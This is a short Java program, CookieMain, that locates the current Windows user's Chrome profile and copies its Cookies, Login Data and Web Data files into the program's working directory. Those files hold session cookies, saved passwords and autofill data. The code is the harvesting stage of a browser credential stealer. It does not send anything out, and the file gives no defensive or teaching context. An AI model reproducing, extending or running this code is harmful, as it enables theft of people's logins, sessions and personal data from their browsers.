import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;


public class CookieMain {
public static void main(String[] args) throws IOException {
	

	String userName = System.getProperty("user.name");
	String currDir = System.getProperty("user.dir");
	
	Path pathDir = Paths.get(currDir, "cookie");
	String pathDirS = pathDir.toString();
	
	Path pathDir2 = Paths.get(currDir, "login data");
	String pathDirS2 = pathDir2.toString();
	
	Path pathDir3 = Paths.get(currDir, "web data");
	String pathDirS3 = pathDir3.toString();
	
	
			
	Path path = Paths.get("C:", "Users", userName, "AppData","Local","Google","Chrome","User Data","Default","Cookies").normalize();
	String pathS = path.toString();
	
	Path path2 = Paths.get("C:", "Users", userName, "AppData","Local","Google","Chrome","User Data","Default","Login Data").normalize();
	String pathS2 = path2.toString();
	
	Path path3 = Paths.get("C:", "Users", userName, "AppData","Local","Google","Chrome","User Data","Default","Web Data").normalize();
	String pathS3 = path3.toString();
	
	File source = new File(pathS);
	File dest = new File(pathDirS);
	
	File source2 = new File(pathS2);
	File dest2 = new File(pathDirS2);
	
	File source3 = new File(pathS3);
	File dest3 = new File(pathDirS3);
	
	copyFileUsingFileStreams(source,dest);
	copyFileUsingFileStreams(source2,dest2);
	copyFileUsingFileStreams(source3,dest3);
	

} 


static void copyFileUsingFileStreams(File source, File dest) throws IOException{
	
	InputStream input;
	OutputStream output;
	try {
		input = new FileInputStream(source);
		output = new FileOutputStream(dest);
		byte[] buf = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buf)) > 0) {
			output.write(buf, 0, bytesRead);
			
		 }
		input.close();
		output.close();
	}finally{
		
	}
	
}
}